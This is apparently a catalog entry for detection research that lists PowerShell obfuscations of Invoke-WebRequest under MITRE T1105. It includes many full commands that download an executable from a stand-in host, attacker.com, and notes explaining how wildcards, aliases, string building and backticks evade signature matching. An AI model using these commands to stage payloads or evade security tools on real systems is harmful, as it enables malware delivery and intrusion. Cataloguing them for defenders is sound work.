---
Name: Invoke-WebRequest
Description: "Download files or interact with web services. PowerShell's built-in HTTP client, commonly used for payload staging."
Platform: powershell
BinaryPath:
  - "PowerShell cmdlet (System.Net.WebClient wrapper)"
Category: download
MitreID: T1105
Patterns:
  - Pattern: "& (gcm I*oke-W*R*) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe"
    Wildcards: ["*"]
    Notes: "Get-Command (gcm) resolves cmdlet by wildcard. I*oke matches Invoke, W*R* matches WebRequest"
  - Pattern: "& (gcm Inv?ke-WebRequest) -Uri ..."
    Wildcards: ["?"]
    Notes: "Single char wildcard replaces 'o'"
  - Pattern: "& (gcm I*-W*t) -Uri ..."
    Wildcards: ["*"]
    Notes: "Abbreviated wildcards, still resolves to Invoke-WebRequest"
  - Pattern: "iwr -Uri ..."
    Wildcards: []
    Notes: "Built-in alias 'iwr' — not a glob but commonly used obfuscation"
  - Pattern: "curl -Uri http://attacker.com/p.exe -OutFile C:\\p.exe"
    Wildcards: []
    Notes: "Alias 'curl' for Invoke-WebRequest (Windows PowerShell 5.1 only; removed in PS Core 6+)"
  - Pattern: "wget -Uri http://attacker.com/p.exe -OutFile C:\\p.exe"
    Wildcards: []
    Notes: "Alias 'wget' for Invoke-WebRequest (Windows PowerShell 5.1 only; removed in PS Core 6+)"
  - Pattern: "& (Get-Command *Web*quest) -Uri ..."
    Wildcards: ["*"]
    Notes: "Full Get-Command with wildcards around 'Web'"
  - Pattern: "& (gcm *-WebR*) -Uri ..."
    Wildcards: ["*"]
    Notes: "Wildcard before verb and in noun"
  - Pattern: "& (gcm Invok[d-f]-WebRequest) -Uri ..."
    Wildcards: ["[d-f]"]
    Notes: "Character range matches 'e' in Invoke"
  - Pattern: "& (gal i?r) -Uri ..."
    Wildcards: ["?"]
    Notes: "Get-Alias with wildcard resolves 'iwr'"
  - Pattern: "& (DIR Alias:/iw?) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe"
    Wildcards: ["?"]
    Notes: "Resolves iwr alias via PowerShell's Alias: PSDrive glob — iw? matches iwr (Invoke-WebRequest)"
  - Pattern: "& (gcm * | ? Name -match '^Inv.*WebR') -Uri http://attacker.com/p.exe -OutFile C:\\p.exe"
    Wildcards: ["-match"]
    Notes: "Regex -match filter on all commands via Where-Object pipeline — regex alternative to glob wildcards"
  - Pattern: "& (gcm ('{0}voke-{1}' -f 'In','WebRequest')) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe"
    Wildcards: []
    Notes: "-f format operator constructs 'Invoke-WebRequest' from string fragments before gcm resolves it"
    Method: "-f format operator"
  - Pattern: "& (Get-Command -Verb Inv* -Noun *WebRequest) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe"
    Wildcards: ["*"]
    Notes: "Get-Command -Verb/-Noun structured split — wildcards on verb and noun independently narrow the match to Invoke-WebRequest"
    Method: "Get-Command -Verb -Noun"
  - Pattern: "& ($ExecutionContext.InvokeCommand.GetCommand('I*-WebRequest','Cmdlet')) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe"
    Wildcards: ["*"]
    Notes: "Engine-level cmdlet resolution via InvokeCommand.GetCommand — bypasses Get-Command entirely; I*-WebRequest resolves to Invoke-WebRequest"
    Method: "ExecutionContext resolution"
  - Pattern: "& (gcm ('Inv'+'oke-We'+'bRequest')) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe"
    Wildcards: []
    Notes: "String concatenation builds the cmdlet name from three fragments — full name never appears contiguous in source"
    Method: "String concatenation"
  - Pattern: "$c = gcm *-WebR*; & $c -Uri http://attacker.com/p.exe -OutFile C:\\p.exe"
    Wildcards: ["*"]
    Notes: "Variable-based invocation — glob resolves to Invoke-WebRequest at assignment time; & invokes the stored CommandInfo object"
    Method: "Variable invocation"
  - Pattern: "& (gcm `I`n`v`o`k`e-WebRequest) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe"
    Wildcards: []
    Notes: "Backtick character insertion — PowerShell ignores backticks before most characters, so the name resolves normally but string-matching signatures miss it"
    Method: "Backtick insertion"
  - Pattern: "& (gcm Microsoft.PowerShell.Utility\\Inv*-WebR*) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe"
    Wildcards: ["*"]
    Notes: "Module-qualified wildcard — forces resolution within Microsoft.PowerShell.Utility while using glob patterns on the cmdlet name"
    Method: "Module-qualified wildcard"
PlatformNotes: |
  PowerShell cmdlet name resolution supports wildcards via `Get-Command`. The pattern `& (gcm Wildcard*Pattern) -Args` is idiomatic "globfuscation". The `&` operator invokes the resolved cmdlet. Aliases like `iwr`, `curl`, `wget` also resolve to Invoke-WebRequest.
Resources:
  - https://attack.mitre.org/techniques/T1105/
  - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest
---
